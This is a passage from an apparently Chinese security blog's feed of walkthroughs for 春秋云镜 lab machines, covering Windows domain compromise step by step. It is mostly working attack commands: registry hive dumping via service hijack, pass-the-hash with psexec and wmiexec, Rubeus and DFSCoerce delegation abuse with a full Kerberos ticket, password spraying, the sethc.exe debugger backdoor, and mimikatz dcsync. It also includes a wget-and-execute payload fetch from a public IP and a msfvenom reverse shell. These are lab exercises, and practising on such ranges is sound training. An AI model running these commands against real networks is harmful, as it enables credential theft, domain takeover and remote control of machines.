/c C:\users\Adrian\Desktop\sam.bat &#x27; --platform windows -f exe-service &gt; a.exe</span><br></pre></td></tr></table></figure><p>然后写一个sam.bat，内容如下然后传到win机器上：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\system C:\Users\Adrian\Desktop\system</span><br><span class="line">reg save hklm\sam C:\Users\Adrian\Desktop\sam</span><br><span class="line">reg save hklm\security C:\Users\Adrian\Desktop\security</span><br></pre></td></tr></table></figure><p>注册表中的这三个位置  存放的就是本机上所有用户包括机器的密码的hash值  所以我们得去获取他</p><p>修改注册表服务 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Services\gupdate&quot; /t REG_EXPAND_SZ /v ImagePath /d &quot;C:\Users\Adrian\Desktop\a.exe&quot; /f</span><br></pre></td></tr></table></figure><p>记得路径不要出错</p><p><img src="../images/image-20231010201813604.png" alt="image-20231010201813604"></p><p>然后运行这个gupdate</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc start gupdate</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231010201918904.png" alt="image-20231010201918904"></p><p>我们就成功把注册表上的几个文件给下载下来了 </p><p><img src="../images/image-20231010212212597.png" alt="image-20231010212212597"></p><p><strong>其实也可以通过这种方式来进行反弹shell操作  但是这个弹到Viper或者cs上的话  使用hashdump和creds_all的话都是获取不到这个机器的hash值的  只能获取到本地账户的hash值</strong>  </p><p>于是我们拖到本地进行离线提权hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 secretsdump.py LOCAL -system system -sam sam -security security</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231010202145550.png" alt="image-20231010202145550"></p><p>这样的话我们的本地管理员和机器用户的hash值就全部爆出来了</p><p><strong>并且有一点就是这个本地管理员的psexec和这个域管的psexec用法还是有不同的</strong></p><p><strong>(可能是因为全部的hash前半部分相同的原因吧)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">本地管理员</span><br><span class="line">proxychains4 python3 psexec.py administrator@172.22.4.45 -hashes &quot;aad3b435b51404eeaad3b435b51404ee:ba21c629d9fd56aff10c3e826323e6ab&quot; -codec gbk</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">域管</span><br><span class="line">proxychains4 python wmiexec.py -hashes :aad3b435b51404eeaad3b435b51404ee xiaorang.lab/administrator@172.22.4.45</span><br></pre></td></tr></table></figure><blockquote><p>这里有一点很奇怪 使用本地管理员 psexec.py来进行连接时  返回的是system权限</p><p>wmiexec.py 连接时返回的时admin权限   </p><p>按道理来说  本地管理员时不应该有system权限的  这是机器才有的权限</p><p>留着思考一下？？？？？？？？？？？？？？</p></blockquote><p>—————————————————————————-(google找了一下  原因是这样的)————————————————————</p><ul><li>这个其实跟psexec.py的运行过程是相关的</li></ul><p><img src="../images/image-20231010223329966.png" alt="image-20231010223329966"></p><p>其实在执行代码的时候  也会回显出代码服务创建  这里就是因为在远程机器上创建了这个系统服务  然后又因为这个系统服务是以<code>system</code>权限来执行的   于是我们获取到的就是这个system权限了</p><p><strong>(前提是必须使用administrator用户来进行连接   不然没有权限来创建这个服务)</strong></p><p><img src="../images/image-20231010223541185.png" alt="image-20231010223541185"></p><p><strong>在了解这个的过程中还发现了这两者都是基于这个<code>ipc$</code>    其对应的就是<code>445  139</code>端口</strong>  </p><p>一般默认是开启的</p><p><img src="../images/image-20231010224004389.png" alt="image-20231010224004389"></p><p><strong>如果执行net share没有反应的话  说明了这个ipc$没有开启   psexec和wmi就用不了了</strong></p><hr><p>为了能过使用本地管理员账户  我们创建一个新账户加到本地管理员组里</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user Ke1nys qwer1234! /add</span><br><span class="line">net localgroup administrators Ke1nys /add</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231010203627261.png" alt="image-20231010203627261"></p><p>这里查看一下域内信息</p><p><img src="../images/image-20231010203717730.png" alt="image-20231010203717730"></p><p>因为这里psexec连接上去的是这个system权限  这个权限是机器的权限  并且只有这个机器在域内  其他用户均为本地成员 看不了域内成员</p><p><img src="../images/image-20231010203836101.png" alt="image-20231010203836101"></p><p>先rdp上刚刚创建的用户</p><p>然后kali运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 bloodhound-python -u win19$ --hashes &quot;aad3b435b51404eeaad3b435b51404ee:544cd3307615b72c370b3fea4d76fb65&quot; -d xiaorang.lab -dc dc01.xiaorang.lab -c all --dns-tcp -ns 172.22.4.7 --auth-method ntlm --zip</span><br><span class="line"></span><br><span class="line">//这个方法很骚  不用上传sharphound就能获取到这个压缩包  只需要获取到一个域账户的密码或者has</span><br><span class="line">//这里用的hash值是机器的hash值  因为只有机器在域内</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231010205618301.png" alt="image-20231010205618301"></p><p><img src="../images/image-20231010211757396.png" alt="image-20231010211757396"></p><p><a href="https://forum.butian.net/share/1944">https://forum.butian.net/share/1944</a>  这篇文章写的很好  几乎总结了非约束委派的攻击</p><p><strong>简洁点说就是强制域控向目标主机发起身份验证  由于开启了非约束委派  就能获取到域控的TGT票据</strong></p><p>先使用<strong>本地管理员</strong>运行<code>Rubeus.exe</code>   并且监听   <strong>(需要管理员权限)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe monitor /interval:1 /nowrap /targetuser:DC01$</span><br></pre></td></tr></table></figure><p>使用 DFSCoerce 漏洞利用工具，触发辅域控进行强制验证</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 dfscoerce.py -u win19$ -hashes &quot;aad3b435b51404eeaad3b435b51404ee:544cd3307615b72c370b3fea4d76fb65&quot; -d xiaorang.lab win19 172.22.4.7</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//这里用的hash值是机器的hash值</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231010210557409.png" alt="image-20231010210557409"></p><p>然后ptt注入到内存中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe ptt /ticket:doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMWElBT1JBTkcuTEFCo4IEVDCCBFCgAwIBEqEDAgECooIEQgSCBD6wZL58oV7f7zZFBrMFkbAa5M+OSIALaywU/VrSxKEOb1HHvPzIbGEW7LMmPRNsZ7v/GB2EMhZ5HySrR/OYXvVwL6SwetfRB4FKQtwxqt9q46DGDzv0Nvu4Vgaq8i6vkO6T9qv+7yOhDUVkNU15LrEmn5x2fNpzdayhLLbmcER61oyplHwnRjohA6hTJzPOFZ2lqb5o7ComIWVn75vlEYD7VrVxvEvzHKVXi+vszYu2pIpjDqG+ypB4ekRoEKLkAm5V0mnhBfwVgNXxD6fJPw7yTsCi5GFRHwwblNmxCKccYyAUa9TSO4ep2UZWvL6ZNfy7FjlgAhIhzpbwqbcyFB02IFqvXK8ii7yn/Wl/ybI0lQkDeqt2XoLhTkOIcn+AEYG+DBiGyPHX1f856QLFS0iRP3wn70JK1br505QCqRt+C9+lLQP8vwQxgsWvcr1lJlEtblOPNl0J4F+QLfKkFYZVVTjs9K7ZOMA2jnTC6MI0PnL1Dq2iDXcYxRZX5IUjkNFzC38pwgl8ENSE87BjMUEfJcrSLv5mR88PbI2/ZEbva9geW483mMMMoBvgsX03zCWto4dUEnfNIxPYpd+lJfMPCAwhMrOJTIYIlOI9D9iCcL1+y3NSf4G7u3MiXXozX3q9LmpYw5KtZA3HdPL4oQ2b5fwSzGj7+x6VaqAvksfLRCU4uwT70kzd05l4L45LHlPao208057PvtEoN5ulakfctRytd6ql3GLWAbx6euNL905niHadPAQoYQA5Y8XiNTvOXU7bmA5dNnXHr/PgrJ2ruG5RIea52HbwLcuAZD28F+pS75bp1j5/wbKUybM/rpEqhNC5kcp7dRqMonbZpmahCbs23rskOr10ApUWEn3r2vPIcVZHRv7Hg/ddellNO9jTHbofARWm0QokiET4pDzb88yaHv50njhkIwBDtM/dvq+ct+qgfDAPKawnLPrUJQD7N1SbFOSWhe2yZKgBi5H4+HYq+R2RZnIApBk9o+n46fKus/z30rRcVPzlw+UyMrhBWO1sQKoPnpmXU6HF5x7TDQTV9mmz662O/PBSTXNrmhrl3kGM7aGazXdS6kvw0efrr+q1sLbIOB0NK1FCG7jaiHA64CSAc2wfv5RdvLbyynfj5xd6EQ6MEPG8uksKAZmQfQBYbDX6VEo3AbOarRFU64fcofmM4bim+mC8zRDO5u6IRzzumKJY5RQBVu8/ariYxmoKO3NATVUG4LD5bGAt3VxvxqZLB8znObSSPV2vpxQgXza1JI/Ka73c8Qjac0GrnFgKaUqX+Qz7f7GpOQW+MrxOCtiMz8h3rcE+DakoD87wVdLUwxVSkm4nCC38ncACTWcNK6LA+JXHl/gEyHKbkIetS43uPyl1EcBFevBgVaqx7UDYBgPftUb3T5QsBAtESt45UFgwgVsSk24OOO6MuR2ZwsvII6Lh4aEWPhujgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCAMuVQ3Nb40HrUocO728XSfvrrukgPxsxytwOi4m+NCqaEOGwxYSUFPUkFORy5MQUKiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDIzMTAxMDExMjIwM1qmERgPMjAyMzEwMTAyMTIyMDNapxEYDzIwMjMxMDE3MTEyMjAzWqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDFhJQU9SQU5HLkxBQg==</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231010210812205.png" alt="image-20231010210812205"></p><p><code>echo &#39;base64xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#39; | base64 -d &gt; DC01.kirbi</code></p><p>这里话也可以将base解码然后存入<code>DC01.kirbi</code>   <strong>(主要是这个后缀  名字无所谓)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::purge&quot; &quot;kerberos::ptt DC01.kirbi&quot;</span><br></pre></td></tr></table></figure><p>当然了  也可以转发为cache导入  这三个是可以互相转化的</p><p>注入票据成功  然后开始dyscn导出域控hash值进行  pth攻击</p><p><img src="../images/image-20231010210950030.png" alt="image-20231010210950030"></p><p><img src="../images/image-20231010211412842.png" alt="image-20231010211412842"></p><p>做题的时候写了点东西</p><blockquote><p>system(机器账户)  是机器账户固有的权限</p><p>administrator(本地管理员账户)  拥有的是别的权限 不是system权限</p><p>这个两个账户是不同的  在这个域中的话  使用hashdump  或者是meterpreter的load kiwi 的creds_all获取的只有这个计算机内的用户的hash值  获取不到这个机器账户的hash值  能获取到的话只有这个注册表里的sam system  security  通过脚本爆破的话是可以爆破出这个机器账户的hash值 (python3 secretsdump.py LOCAL -system system -sam sam -security security)</p><p>当然了 一般除了system和admin用户外  一般人下载不到这三个注册表里的东西 (提权用的东西除外)</p><p>还有一点就是本地普通用户的话 执行 net user /domain  的话  是会报错的<br>WIN\xxx  这种用户名的一般是本地用户</p><p>域用户的话一般是—————》  xxxx@domain</p><p>可能存在的一种情况就是机器是域内账户  其他是本地账户  如果要想执行别的操作的话  大多数情况下是得要域内账户</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;fscan开扫&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20231010192348417.png&quot; alt=&quot;image-20231010192348417&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-202310101</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>域渗透-注册表漏洞利用</title>
    <link href="https://ke1nys.github.io/posts/27821cfa.html"/>
    <id>https://ke1nys.github.io/posts/27821cfa.html</id>
    <published>2023-10-10T03:10:38.000Z</published>
    <updated>2023-10-20T14:12:45.766Z</updated>
    
    <content type="html"><![CDATA[<p>先占个坑  以后深入学习了 后面再写</p><p><a href="https://www.freebuf.com/articles/es/214551.html">https://www.freebuf.com/articles/es/214551.html</a></p><p><a href="https://www.cnblogs.com/Mikasa-Ackerman/p/Windows-zhu-ce-biao-de-xue-xi.html">https://www.cnblogs.com/Mikasa-Ackerman/p/Windows-zhu-ce-biao-de-xue-xi.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;先占个坑  以后深入学习了 后面再写&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.freebuf.com/articles/es/214551.html&quot;&gt;https://www.freebuf.com/articles/es/214551.html&lt;/a&gt;&lt;/</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>春秋云镜-Tsclient</title>
    <link href="https://ke1nys.github.io/posts/72d64c19.html"/>
    <id>https://ke1nys.github.io/posts/72d64c19.html</id>
    <published>2023-10-07T13:16:01.000Z</published>
    <updated>2023-10-07T14:29:22.122Z</updated>
    
    <content type="html"><![CDATA[<p>常规操作 fscan开扫</p><p><img src="../images/image-20231007211805267.png" alt="image-20231007211805267"></p><p>只有一个win主机  并且这个win主机的话 是开启了mssql服务  并且使用了弱口令</p><p>MDUT登录</p><p><img src="../images/image-20231007211940258.png" alt="image-20231007211940258"></p><p>这条权限开启了  尝试土豆家族提权</p><p>然后上线CS</p><p><img src="../images/image-20231007212152027.png" alt="image-20231007212152027"></p><p>这里的话我是使用了spawn来派生到meterpreter</p><p><a href="https://blog.csdn.net/weixin_39190897/article/details/118353886">https://blog.csdn.net/weixin_39190897/article/details/118353886</a></p><p>其实meterpreter的getsystem自带这个土豆提权</p><p>在拿到第一个flag的时候 <strong>提示我们看看域内有没有别的用户</strong> </p><p>于是我们使用别的命令进行查看  （<strong>等会我们偷下别人的图  因为懒的重置靶机重新打了）</strong></p><p><em>**</em> <img src="../images/image-20231007212726960.png" alt="image-20231007212726960"></p><p><img src="../images/image-20231007212737126.png" alt="image-20231007212737126"></p><p><img src="../images/image-20231007212755698.png" alt="image-20231007212755698"></p><p>因为我们获得了这个system权限  于是我们直接注入这个用户的rdp进程</p><p><img src="../images/image-20231007212906974.png" alt="image-20231007212906974"></p><p>上线后查看用户可以看到它存在共享文件</p><p><img src="../images/image-20231007212925680.png" alt="image-20231007212925680"></p><p>然后直接访问这个共享文件夹的文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell type \\tsclient\c\credential.txt</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell type \\tsclient\c\credential.txt</span><br><span class="line">[*] Tasked beacon to run: type \\tsclient\c\credential.txt</span><br><span class="line">[+] host called home, sent: 63 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">xiaorang.lab\Aldrich:Ald@rLMWuy7Z!#</span><br><span class="line"></span><br><span class="line">Do you know how to hijack Image?</span><br></pre></td></tr></table></figure></blockquote><p>读出来一个域账户和提示</p><p>于是先去尝试进行密码喷洒攻击  看看是谁的密码</p><p>(但是是在内网  于是我们先上传fscan扫一下)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">172.22.8.18  就是外网主机的内网地址  WIN-WEB</span><br><span class="line"></span><br><span class="line">172.22.8.15  DC01 </span><br><span class="line"></span><br><span class="line">172.22.8.31  WIN19-CLIENT</span><br><span class="line"></span><br><span class="line">172.22.8.46  Win2016</span><br><span class="line"></span><br><span class="line">netstat的时候看到  31正在RDP18</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">这次拿win主机来当跳板机</span><br></pre></td></tr></table></figure><p>整理好信息后  我们上传代理</p><p>然后密码喷洒</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q crackmapexec smb 172.22.8.0/24 -u &#x27;Aldrich&#x27; -p &#x27;Ald@rLMWuy7Z!#&#x27;</span><br><span class="line">proxychains4 crackmapexec rdp 172.22.8.0/24 -u Aldrich -p Ald@rLMWuy7Z!# -d xiaorang.lab</span><br></pre></td></tr></table></figure><p>smb和RDP谁都可以</p><p>然后发现31 46都可以 </p><p>于是进行登录  这里rdp登录会话的会提示密码过期</p><p>于是我们对这两账号密码进行修改</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 smbpasswd.py xiaorang.lab/Aldrich:&#x27;Ald@rLMWuy7Z!#&#x27;@172.22.8.15 -newpass &#x27;Whoami@666&#x27;</span><br></pre></td></tr></table></figure><p>但是这里话只能登录  46这台机器  31这台机器的话不可以  会提示我们不在远程登录这个组里面</p><p>登录46这台机器后呢  我们根据前面的提示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Do you know how to hijack Image?</span><br></pre></td></tr></table></figure><p>就是镜像提权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">get-acl -path &quot;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options&quot; | fl *</span><br><span class="line"></span><br><span class="line">//这个是查看权限</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231007222419719.png" alt="image-20231007222419719"></p><p>这个用户就是经过身份验证的用户获取到的权限</p><p><strong>(SetValue  CreateSubKey ReadKey)的话  就是具有读写权限</strong></p><p><a href="https://www.freebuf.com/articles/es/214551.html">https://www.freebuf.com/articles/es/214551.html</a>  <strong>镜像劫持的文章</strong></p><p>这里我们发现所有正常登录的用户都可以修改注册表，利用这个性质，修改注册表映像劫持</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot; /v Debugger /t REG_SZ /d &quot;C:\Windows\System32\cmd.exe&quot;</span><br></pre></td></tr></table></figure><p>简单的说就是打开注册表的同时  管理员cmd命令行也会弹出来 </p><p>然后我们点击左下角的头像  点锁定</p><p><img src="../images/image-20231007213906983.png" alt="image-20231007213906983"></p><p>然后连续点击shift  就会弹出来了</p><p><img src="../images/image-20231007213944604.png" alt="image-20231007213944604"></p><p>然后就可以读取flag了</p><p>然后开始sharpblood查看域</p><p><img src="../images/image-20231007214100613.png" alt="image-20231007214100613"></p><p>发现了我们rdp的这个机器有域控的权限</p><p>因为我们也获取了该机器的管理员权限</p><p>使用<code>sekurlsa::logonpasswords</code>抓取本机hash值</p><p>于是我们使用mimikatz导出该机器的hash值进行hash传递</p><p>然后执行dscync来导出域内所有hash值 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. sekurlsa::logonpasswords</span><br><span class="line">2. mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:WIN2016$ /domain:xiaorang.lab /ntlm:4ba974f170ab0fe1a8a1eb0ed8f6fe1a&quot; &quot;exit&quot;</span><br><span class="line">3. mimikatz.exe &quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot; &quot;exit&quot;</span><br><span class="line"></span><br><span class="line">这样的话我们就能拿到域管的hash值了</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后拿着域管的hash值进行pth攻击就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python psexec.py -hashes :2c9d81bdcf3ec8b1def10328a7cc2f08 xiaorang.lab/administrator@172.22.8.46</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;常规操作 fscan开扫&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20231007211805267.png&quot; alt=&quot;image-20231007211805267&quot;&gt;&lt;/p&gt;
&lt;p&gt;只有一个win主机  并且这个win主机的话 是开启了mss</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>春秋云镜-Initial</title>
    <link href="https://ke1nys.github.io/posts/327fc326.html"/>
    <id>https://ke1nys.github.io/posts/327fc326.html</id>
    <published>2023-10-06T10:33:59.000Z</published>
    <updated>2023-10-07T14:29:22.122Z</updated>
    
    <content type="html"><![CDATA[<p>这个靶机比较特殊  他是由三部分的flag组成一个完整的flag</p><p><img src="../images/image-20231006183707297.png" alt="image-20231006183707297"></p><p>漏洞都给扫出来了 直接去打就行了</p><p><img src="../images/image-20231006184027853.png" alt="image-20231006184027853"></p><p>直接去写马  然后反弹shell</p><p><img src="../images/image-20231006184318407.png" alt="image-20231006184318407"></p><p><img src="../images/image-20231006184327154.png" alt="image-20231006184327154"></p><p>然后sudo -l 发现了这个mysql可以利用来提权</p><p><img src="../images/image-20231006184416198.png" alt="image-20231006184416198"></p><p><img src="../images/image-20231006184457584.png" alt="image-20231006184457584"></p><p><img src="../images/image-20231006184514890.png" alt="image-20231006184514890"></p><p>上传个fscan扫一下内网</p><p><img src="../images/image-20231006185041206.png" alt="image-20231006185041206"></p><p>整理一下信息</p><blockquote><p>172.22.1.2  DC域控主机</p><p>172.22.1.15  外网主机  getshell</p><p>172.22.1.18   3306  OA系统</p><p>172.22.1.21  域内主机  MS17  永恒之蓝</p></blockquote><p>先给这个linux主机上msf先  </p><p><img src="../images/image-20231006185355983.png" alt="image-20231006185355983"></p><p>成功上线</p><p>然后去使用stowaway挂个代理</p><p><img src="../images/image-20231006190449700.png" alt="image-20231006190449700"></p><p>既然说这个21这个台主机存在<strong>MS17</strong></p><p>这里的话我是用kali下的msf打的  服务器上的话不知道为啥老是失败</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 msfconsole</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp_uuid  //这个是个关键了 可以配合proxychains4本地使用</span><br><span class="line">set RHOSTS 172.22.1.21</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>如果要是再服务器上用的话要加上route add xxxx</p><p><img src="../images/image-20231006190643419.png" alt="image-20231006190643419"></p><p>成功上线这台域内主机  还是system权限</p><p>然后上传个<code>sharphound.exe</code>进去分析一下域内环境</p><p><img src="../images/image-20231006190804985.png" alt="image-20231006190804985"></p><p>发现这个机器对域控有DCSync权限  于是我们导出域内所有人的hash值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line">kiwi_cmd &quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot; exit</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231006191007593.png" alt="image-20231006191007593"></p><p>拿到了域管的hash值  那么直接pth攻击</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">hash传递攻击的几种方法  (其原理都是使用smb服务来进行攻击)</span><br><span class="line"></span><br><span class="line">psexec.py</span><br><span class="line"></span><br><span class="line">proxychains4 python psexec.py -hashes :10cf89a850fb1cdbe6bb432b859164c8 xiaorang.lab/administrator@172.22.1.2</span><br><span class="line"></span><br><span class="line">-hashes: 域管hash值 dscyn获取</span><br><span class="line">xiaorang.lab  域名</span><br><span class="line">administrator 域管账户</span><br><span class="line">172.22.1.2 域控账户</span><br><span class="line"></span><br><span class="line">wmiexec.py</span><br><span class="line"></span><br><span class="line">proxychains4 python wmiexec.py -hashes :10cf89a850fb1cdbe6bb432b859164c8 xiaorang.lab/administrator@172.22.1.2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">crackmapexec  (这种是不能进入shell命令行的 )</span><br><span class="line"></span><br><span class="line">proxychains4 crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x &quot;type Users\Administrator\flag\flag03.txt&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">impacket-wmiexec </span><br><span class="line"></span><br><span class="line">proxychains4 impacket-wmiexec xiaorang.lab/administrator@172.22.1.18 -hashes :10cf89a850fb1cdbe6bb432b859164c8</span><br></pre></td></tr></table></figure><p><strong>这就是使用pth攻击的几种方法  这里就打完了  拿着域管的hash去登录另一台机器就行了  (OA)</strong></p><p>(上面工具原理就是基于这个<strong>SMB服务</strong>   <strong>445端口</strong>)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这个靶机比较特殊  他是由三部分的flag组成一个完整的flag&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20231006183707297.png&quot; alt=&quot;image-20231006183707297&quot;&gt;&lt;/p&gt;
&lt;p&gt;漏洞都给扫出来了 直</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>Msf反弹shell与不出网主机上线</title>
    <link href="https://ke1nys.github.io/posts/af4fc312.html"/>
    <id>https://ke1nys.github.io/posts/af4fc312.html</id>
    <published>2023-10-04T13:29:20.000Z</published>
    <updated>2023-10-09T14:05:19.749Z</updated>
    
    <content type="html"><![CDATA[<p>这里用这个春秋云镜的Certify靶机举例子</p><p><strong>使用这里的前提是先反弹shell到我们的vps上</strong></p><p>先使用web_delivery这模块来进行监听</p><p><img src="../images/image-20231004213357075.png" alt="image-20231004213357075"></p><p><img src="../images/image-20231004213438149.png" alt="image-20231004213438149"></p><p>把这几个地方配置好  然后run运行  我们就会的到一个命令行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -qO 2yheDLvT --no-check-certificate http://101.42.39.110:1234/605OcaF; chmod +x 2yheDLvT; ./2yheDLvT&amp; disown</span><br></pre></td></tr></table></figure><p>然后到tmp目录下进行运行</p><p><img src="../images/image-20231004213603113.png" alt="image-20231004213603113"></p><p>然后我们的这个web_delivery这个模块就可以监听到反弹的shell</p><p>然后查看内网ip</p><p>设置route</p><p><img src="../images/image-20231004213819118.png" alt="image-20231004213819118"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">图中写错了 </span><br><span class="line">应该是 route add 172.22.9.0 255.255.0.0 1   不用set</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>(前面的172.22.9.0是内网ip  然后255.255.0.0  后面跟着的是session的id)</strong></p><p><img src="../images/image-20231004213924480.png" alt="image-20231004213924480"></p><p>然后再使用msfvenom来生成windows的exe文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.22.2.7 LPORT=9002 -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure><p>这里的Lhost就是我们getshell的linux机器</p><p>然后我们使用   exploit/multi/handler 进行监听windows机器反弹的shell</p><p><img src="../images/image-20231004214103299.png" 